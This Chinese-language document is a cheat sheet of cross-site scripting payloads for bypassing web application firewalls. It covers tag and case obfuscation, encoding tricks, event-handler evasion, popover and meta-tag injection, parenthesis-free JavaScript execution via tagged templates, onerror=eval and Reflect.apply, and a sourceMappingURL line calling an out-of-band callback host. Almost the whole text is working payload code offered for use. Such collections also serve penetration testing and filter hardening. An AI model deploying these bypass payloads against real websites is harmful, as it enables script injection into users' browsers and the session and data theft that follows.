## WAF绕过

### 黑名单绕过

```javascript
//随机大小写
<script> --> <ScrIpT>
<img --> <ImG

//双标签
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//替换空格分隔属性
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//父标签
<svg><x><script>alert('1'&#41</x>

//奇怪属性
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///注意换行符
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//不关闭标签， " <" 或 " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//额外打开
<<script>alert("XSS");//<</script>

//编写奇怪的标签
<</script/script><script>
<input type=image src onerror="prompt(1)">

//使用 `` 代替括号
onerror=alert`1`

//使用多个标签
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```

### 不带括号

[我括号呢](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/XSS/Without-Parentheses.md)

### 长度绕过

[terjanq](https://tinyxss.terjanq.me/)

[Tiny XSS Payloads](https://github.com/terjanq/Tiny-XSS-Payloads)

### 绕过内部事件

```javascript
<a id="author" href="http://none" onclick="var tracker='http://foo?
&apos;-alert(1)-&apos;
';">Go Back </a>
```

```javascript
//HTML实体
&apos;-alert(1)-&apos;
//HTML十六进制
&#x27-alert(1)-&#x27
//HTML十六进制
&#x00027-alert(1)-&#x00027
//HTML十进制
&#39-alert(1)-&#39
//HTML十进制
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>

URL编码
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>

Unicode编码
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```

### 事件处理程序绕过

```javascript
<svg onload%09=alert(1)> //safari不可用
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//onevent和"="之间可以使用的字符
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```

### 隐藏输入和元标记

隐藏输入
```javascript
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle=alert(1)>
```

元标记
```javascript
元属性内注入
<meta name="apple-mobile-web-app-title" content=""Twitter popover id="newsletter" onbeforetoggle=alert(2) />

现有目标内注入
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```

### JavaScript绕过黑名单

字符串
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```

特殊字符
```javascript
'\b' //退格
'\f' //换页
'\n' //换行
'\r' //回车
'\t' //tab
```

空格替换
```javascript
<TAB>
/**/
```

JavaScript注释
```javascript
//1行注释
/*多行注释*/
<!--1行注释
#!一行注释, "#!"必须为一行开头
-->一行注释， "-->"必须为一行开头
```

新行
```javascript
//JavaScript将这些字符串解释为换行
String.fromCharCode(10); alert('//\nalert(1)') //0x0a
String.fromCharCode(13); alert('//\ralert(1)') //0x0d
String.fromCharCode(8232); alert('//\u2028alert(1)') //0xe2 0x80 0xa8
String.fromCharCode(8233); alert('//\u2029alert(1)') //0xe2 0x80 0xa9
```

空格
```javascript
log=[];
function funct(){}
  for(let i=0;i<=0x10ffff;i++){
      try{
        eval(`funct${String.fromCodePoint(i)}()`);
        log.push(i);
      }
      catch(e){}
  }
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279
//可以使用原始字符，如果出现在svg或HTML属性中需要对其HTML编码
<img/src/onerror=alert&#65279;(1)>
```

注释中的JavaScript
```javascript
//需要用户打开DevTools
//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```

JavaScript不带括号
```javascript
//通过设置 location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
//或者任何DOM XSS接收器，例如location=name

//将字符串作为数值为1的字符传递
alert`1`

//反向提示 + 标记模板 + call/apply
eval`alert\x281\x29` //不会起作用，因为它只会返回传递的数组
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

//传递多个参数
function btt(){
    console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//构造一个函数并调用
Function`x${'alert(1337)'}x```

//替换可以使用正则表达式并在发现某些内容时调用
"a,".replace`a${alert}` //初始["a"] 作为 "a"传递给str
"a".replace.call`1${/./}${alert}`

"a".replace.call`1337${/..../}${alert}` //alert 1337

//使用 Reflect.apply 调用具有任何参数的任何函数
Reflect.apply.call`${alert}${window}${[1337]}`
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
//使用 Reflect.set 调用任意值设置为变量
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}`



//当对象用作原语时，会调用这些操作.因为这些对象是作为this传递的,而alert()需要windows作为this的值,所以windows方法是用过的
valueOf=alert;window+''
toString=alert;window+''


//错误处理程序
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
  // Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
  // Error handler + Comma separator
  // The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
  // optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
  // The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.
```
